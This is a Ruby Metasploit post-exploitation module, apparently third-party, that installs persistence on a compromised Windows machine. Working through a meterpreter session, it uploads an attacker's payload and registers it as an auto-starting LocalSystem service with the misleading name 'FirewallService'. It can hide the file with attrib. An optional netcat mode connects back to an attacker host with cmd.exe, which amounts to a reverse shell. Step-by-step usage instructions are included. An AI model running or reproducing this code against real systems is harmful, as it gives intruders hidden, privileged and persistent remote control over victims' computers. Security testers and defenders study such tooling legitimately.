##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : deploy_service_payload.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Tested on      : Windows 7 (build 7600/76001 SP1 64 bits) | XP SP1 (32 bits)
#
#
# [ DESCRIPTION ]
# deploy_service_payload.rb uploads your payload.exe to target system (DEPLOY_PATH)
# and creates a service pointing to it (SERVICE_NAME). The service will auto-start
# with windows with Local/System privileges. Rebooting the system or restarting the
# service will run the malicious executable with elevated privileges.
#
# "WARNING: This module will not delete the payload deployed"
# "WARNING: Note that only executables explicitly written to interface with the Service Control
# Manager should be installed this way. While SC will happily accept a regular non-service binary,
# you will receive the fatal Error 1053 when you attempt to start the service, please read the follow
# article: http://www.howtogeek.com/50786/using-srvstart-to-run-any-application-as-a-windows-service
#
#
#
# [ MODULE DEFAULT OPTIONS ]
# The session number to run this module on        => set SESSION 3
# The service name to be created (or query)       => set SERVICE_NAME MyService
# Input the payload name to be uploaded           => set PAYLOAD_NAME payload.exe
# The destination path were to deploy payload     => set DEPLOY_PATH %userprofile%
# The full path (local) of payload to be uploaded => set LOCAL_PATH /root/payload.exe
#
# [ MODULE ADVANCED OPTIONS ]
# Use attrib to hide your payload.exe?            => set HIDDEN_ATTRIB true
# Check malicious service settings?               => set SERVICE_STATUS true
# Delete malicious service?                       => set DEL_SERVICE true
# Deploy netcat (nc.exe) insted of payload.exe?   => set USE_NETCAT true
# The LHOST to use (netcat only)                  => set NC_LHOST 192.168.1.67
# The LPORT to use (netcat only)                  => set NC_LPORT 666
#
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/manage/deploy_service_payload.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/manage/deploy_service_payload.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/manage
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/manage/deploy_service_payload
# msf post(deploy_service_payload) > info
# msf post(deploy_service_payload) > show options
# msf post(deploy_service_payload) > show advanced options
# msf post(deploy_service_payload) > set [option(s)]
# msf post(deploy_service_payload) > exploit
#
#
# [ HOW TO TRIGGER THE VULNERABILITY ]
# 1 - exploit target machine (meterpreter payload - open session)
# 2 - build new payload.exe (2º payload to be uploaded by this module) OR netcat (nc.exe)
# 3 - start conrrespondent handler (2º payload handler) or netcat handler (nc -lvp LPORT)
# 4 - use post/windows/manage/deploy_service_payload
# 5 - set required options
# 6 - exploit
##



# ----------------------------
# Module Dependencies/requires
# ----------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'



# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = GreatRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Error



# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'Deploy service payload [persistence]',
                        'Description'   => %q{
                                        deploy_service_payload.rb uploads your payload.exe to target system (DEPLOY_PATH) and creates a service pointing to it (SERVICE_NAME). The service will auto-start with windows with Local/System privileges. Rebooting the system or restarting the service will run the malicious executable with elevated privileges. "WARNING: This module only supports .exe executables to upload"
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                        'SpecialThanks: Fatima Ferreira | Chaitanya', # colaborators
                                ],
 
                        'Version'        => '$Revision: 2.0',
                        'DisclosureDate' => 'nov 13 2016',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'true',
                        'Targets'        =>
                                [
                                         # Tested againts windows 7 (build 7600/7601) SP 1 | XP SP1 (32 bits)
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '3', # default its to run againts windows 7 (build 7600)
                        'References'     =>
                                [
                                         [ 'URL', 'http://goo.gl/nKpnXD' ],
                                         [ 'URL', 'http://sourceforge.net/users/peterubuntu10' ],
                                         [ 'URL', 'https://support.microsoft.com/en-us/kb/251192' ],
                                         [ 'URL', 'http://sourceforge.net/projects/msf-auxiliarys/repository' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1', # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('SERVICE_NAME', [ false, 'The service NAME to be created (eg MyService)']),
                                OptString.new('PAYLOAD_NAME', [ false, 'The payload NAME to be uploaded (eg shell.exe)']),
                                OptString.new('DEPLOY_PATH', [ false, 'The destination were to deploy (eg %userprofile%)']),
                                OptString.new('LOCAL_PATH', [ false, 'The full path of payload.exe to upload (eg /root/shell.exe)'])
                        ], self.class)

                register_advanced_options(
                        [
                                OptString.new('NC_LHOST', [ false, 'The LHOST to use (netcat only)']),
                                OptString.new('NC_LPORT', [ false, 'The LPORT to use (netcat only)']),
                                OptBool.new('USE_NETCAT', [ false, 'Deploy netcat (nc.exe) insted of payload.exe?' , false]),
                                OptBool.new('HIDDEN_ATTRIB', [ false, 'Use Attrib command to Hide payload.exe?' , false]),
                                OptBool.new('SERVICE_STATUS', [ false, 'Check malicious service settings?' , false]),
                                OptBool.new('DEL_SERVICE', [ false, 'Delete malicious service?' , false])
                        ], self.class) 
        end




# ----------------------------------------------
# Check for proper target Platform (win32|win64)
# ----------------------------------------------
def unsupported
   session = client
     sys_info = session.sys.config.sysinfo
       print_warning("[ABORT]: Operative System => #{sys_info['OS']}")
       print_error("Only windows systems are supported by this module...")
       print_error("Please execute [info] for further information...")
       print_line("")
   raise Rex::Script::Completed
end




# -----------------------------------------
# UPLOAD OUR EXECUTABLE INTO TARGET SYSYTEM
# -----------------------------------------
def ls_stage1

  r=''
  session = client
  l_port = datastore['NC_LPORT']     # 666          => for netcat settings
  l_host = datastore['NC_LHOST']     # 192.168.1.67 => for netcat settings
  u_path = datastore['LOCAL_PATH']   # /root/payload.exe
  d_path = datastore['DEPLOY_PATH']  # %userprofile%
  s_name = datastore['SERVICE_NAME'] # myservice
  p_name = datastore['PAYLOAD_NAME'] # payload.exe
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['LOCAL_PATH'] == 'nil' || datastore['SERVICE_NAME'] == 'nil' || datastore['PAYLOAD_NAME'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set LOCAL_PATH | SERVICE_NAME | PAYLOAD_NAME options!")
    return nil
  else
    print_status("Deploying backdoor into target system!")
    sleep(1.5)
  end

    # chose what kind of payload to deploy
    if datastore['USE_NETCAT'] == true
      c_omm = "sc create \"#{s_name}\" binpath= \"#{d_path}\\#{p_name} #{l_host} #{l_port} -e C:\\Windows\\System32\\cmd.exe\" DisplayName= FirewallService error= ignore start= auto obj= LocalSystem"
    else
      c_omm = "sc create \"#{s_name}\" binPath= \"#{d_path}\\#{p_name} -k runservice\" DisplayName= FirewallService error= ignore start= auto obj= LocalSystem"
    end

        # upload our executable into target system..
        print_good(" Uploading #{p_name} agent...")
        client.fs.file.upload("#{d_path}\\#{p_name}","#{u_path}")

          # creating remote service ...
          print_good(" Creating service: #{s_name} ...")
          print_good(" Execute => #{c_omm}")
          r = session.sys.process.execute("cmd.exe /c #{c_omm}", nil, {'Hidden' => true, 'Channelized' => true})
          sleep(3.0)

          # start remote malicious service
          print_status("Service created successefuly!")
          r = session.sys.process.execute("cmd.exe /c sc start #{s_name}", nil, {'Hidden' => true, 'Channelized' => true})
          sleep(1.5)

        # task completed successefully...
        print_status("Setup one handler and Wait everytime that system restarts OR")
        print_status("Setup one handler and restart service: sc start #{s_name}")
        print_line("")

      # close channel when done
      r.channel.close
      r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# -------------------------------------------------
# USE ATTRIB COMMAND TO HIDDE PROGRAM.EXE (PAYLOAD)
# -------------------------------------------------
def ls_stage2

  r=''
  session = client
  d_path = datastore['DEPLOY_PATH']  # %userprofile%
  p_name = datastore['PAYLOAD_NAME'] # payload.exe
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['DEPLOY_PATH'] == 'nil' || datastore['PAYLOAD_NAME'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set DEPLOY_PATH | PAYLOAD_NAME options!")
    return nil
  else
    print_status("Using Attrib command to hide backdoor!")
    sleep(1.5)
  end


    # check if backdoor.exe exist in target
    if client.fs.file.exist?("#{d_path}\\#{p_name}")
      print_good(" Backdoor agent: #{p_name} found!")
      sleep(1.5)
      # change attributes of backdoor to hidde it from site...
      r = session.sys.process.execute("cmd.exe /c attrib +h +s #{d_path}\\#{p_name}", nil, {'Hidden' => true, 'Channelized' => true})
      print_good(" Execute => cmd.exe /c attrib +h +s #{d_path}\\#{p_name}")
      sleep(1.5)

        # diplay output to user
        print_status("Our agent its hidden from normal people site!")
        print_status("Just dont feed the black hacker within :( ")
        print_line("")

      # close channel when done
      r.channel.close
      r.close

    else
      print_error("ABORT: post-module cant find backdoor agent path...")
      print_error("BACKDOOR_AGENT: #{d_path}\\#{p_name}")
      print_line("")
    end


  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# ------------------------
# DELETE MALICIOUS SERVICE
# ------------------------
def ls_stage3

  r=''
  session = client
  s_name = datastore['SERVICE_NAME'] # myservice
  hklm = "HKLM\\System\\CurrentControlSet\\services\\#{s_name}"
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['SERVICE_NAME'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set SERVICE_NAME option!")
    return nil
  else
    print_status("Disable/Delete malicious service!")
    sleep(1.5)
  end


    print_warning("Reading service hive registry keys...")
    sleep(1.0)
    # search in target regedit for service existence
    if registry_enumkeys("HKLM\\System\\CurrentControlSet\\services\\#{s_name}")
      print_good(" Remote service: #{s_name} found!")
      sleep(1.0)
    else
       print_error("ABORT: post-module cant find service...")
       print_warning("enter into a shell session and execute: sc qc #{s_name}")
       sleep(1.0)
       return nil
    end

    # stop remote malicious service...
    print_good(" Execute => sc stop #{s_name}")
    r = session.sys.process.execute("cmd.exe /c sc stop #{s_name}", nil, {'Hidden' => true, 'Channelized' => true})
    sleep(2.0)

      # delete remote malicious service...
      print_good(" Execute => sc delete #{s_name}")
      r = session.sys.process.execute("cmd.exe /c sc delete #{s_name}", nil, {'Hidden' => true, 'Channelized' => true})
      sleep(1.5)

    # task completed successefully...
    print_warning("Malicious service disabled/deleted!")
    print_status("we have lost our backdoor :( but feeded the white hacker within :D")
    print_line("")

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# ----------------------------
# CHECK/DISPLAY SERVICE STATUS
# ----------------------------
def ls_stage4

  r=''
  s_key = "Start"
  session = client
  b_key = "ImagePath"
  o_key = "ObjectName"
  d_key = "DisplayName"
  e_cont = "1   NORMAL"
  s_type = "10  WIN32_OWN_PROCESS"
  s_name = datastore['SERVICE_NAME'] # myservice
  hklm = "HKLM\\System\\CurrentControlSet\\services\\#{s_name}"
  sys_nfo = session.sys.config.sysinfo
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['SERVICE_NAME'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set SERVICE_NAME option!")
    return nil
  else
    print_status("Checking remote service settings!")
    sleep(1.5)
  end


    print_warning("Reading service hive registry keys...")
    sleep(1.0)
    # search in target regedit for service existence
    if registry_enumkeys("HKLM\\System\\CurrentControlSet\\services\\#{s_name}")
      print_good("Remote service: #{s_name} found!")
      remote_service = "#{s_name}"
      sleep(1.0)
    else
      print_error("ABORT: post-module cant find service in regedit...")
      print_warning("enter into a shell session and execute: sc qc #{s_name}")
      print_line("")
      print_line("")
      # display remote service current settings...
      # cloning SC qc <ServiceName> display outputs...  
      print_line("SERVICE_NAME: #{s_name}")
      print_line(" [SC] Query Service Failed 404: NOT FOUND")
      print_line("")
      print_line("")
    return nil
    end


      # search in target regedit for service auto-start status
      # Value:Start - dword: 2 - auto | 3 - manual | 4 - disabled
      local_machine_value = registry_getvaldata(hklm,s_key)
        if local_machine_value.nil? || local_machine_value == 0
         start_up = ""
         print_error("post-module cant define service auto_start status...")
         print_warning("enter into a shell session and execute: sc qc #{s_name}")
         sleep(1.0)
          elsif local_machine_value == 2
            start_up = "2   AUTO_START"
          elsif local_machine_value == 3
            start_up = "3   DEMAND_START"
          elsif local_machine_value == 4
            start_up = "4   DISABLED_START"
        else
          start_up = ""
          print_error("post-module cant define service auto_start status...")
          print_warning("enter into a shell session and execute: sc qc #{s_name}")
          sleep(1.0)
        end


    # search in regedit for privileges (LocalSystem)
    priv_machine_value = registry_getvaldata(hklm,o_key)
      if priv_machine_value.nil?
       obj_name = ""
       print_error("post-module cant define service privileges...")
       print_warning("enter into a shell session and execute: sc qc #{s_name}")
       sleep(1.0)
      else
        obj_name = "#{priv_machine_value}"
      end


    # search in regedit for service DisplayName
    display_name_value = registry_getvaldata(hklm,d_key)
      if display_name_value.nil?
       display_name = ""
       print_error("post-module cant define service display name...")
       print_warning("enter into a shell session and execute: sc qc #{s_name}")
       sleep(1.0)
      else
        display_name = "#{display_name_value}"
      end


    # search in regedit for binary_path_name value
    bin_path_value = registry_getvaldata(hklm,b_key)
      if bin_path_value.nil?
       bin_path = ""
       print_error("post-module cant define service binary_path_name...")
       print_warning("enter into a shell session and execute: sc qc #{s_name}")
       sleep(1.0)
      else
        bin_path = "#{bin_path_value}"
      end


    sleep(1.0)
    print_line("")
    print_line("")
    # display remote service current settings...
    # cloning SC qc <ServiceName> display outputs...  
    print_line("SERVICE_NAME: #{remote_service}")
    print_line("        TYPE               : #{s_type}")
    print_line("        START_TYPE         : #{start_up}")
    print_line("        ERROR_CONTROL      : #{e_cont}")
    print_line("        BINARY_PATH_NAME   : #{bin_path}")
    print_line("        LOAD_ORDER_GROUP   :")
    print_line("        TAG                : 0")
    print_line("        DISPLAY_NAME       : #{display_name}")
    print_line("        DEPENDENCIES       :")
    print_line("        SERVICE_START_NAME : #{obj_name}")
    print_line("")
    print_line("")

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client
    # Check for proper target Platform
    unsupported if client.platform !~ /win32|win64/i

      # Variable declarations (msf API calls)
      sys_nfo = session.sys.config.sysinfo
      run_tor = client.sys.config.getuid
      run_session = client.session_host
      r_directory = client.fs.dir.pwd
      r_port = client.session_port


    # Print banner and scan results on screen pdfcDispatcher
    print_line("    +---------------------------------------------+")
    print_line("    |   DEPLOY SERVICE PAYLOAD [ persistence ]    |")
    print_line("    |     Author: Pedro Ubuntu [ r00t-3xp10it ]   |")
    print_line("    +---------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sys_nfo['Computer']}")
    print_line("    Operative System    : #{sys_nfo['OS']}")
    print_line("    Target IP addr      : #{run_session}")
    print_line("    Target Session Port : #{r_port}")
    print_line("    Payload directory   : #{r_directory}")
    print_line("    Client UID          : #{run_tor}")
    print_line("")
    print_line("")


    # check for proper session.
    if not sysinfo.nil?
      print_status("Running module against: #{sys_nfo['Computer']}")
    else
      print_error("ABORT]:This post-module only works in meterpreter sessions")
      raise Rex::Script::Completed
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end


# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['LOCAL_PATH']
         ls_stage1
      end

      if datastore['HIDDEN_ATTRIB']
         ls_stage2
      end

      if datastore['DEL_SERVICE']
         ls_stage3
      end

      if datastore['SERVICE_STATUS']
         ls_stage4
      end

   end
end
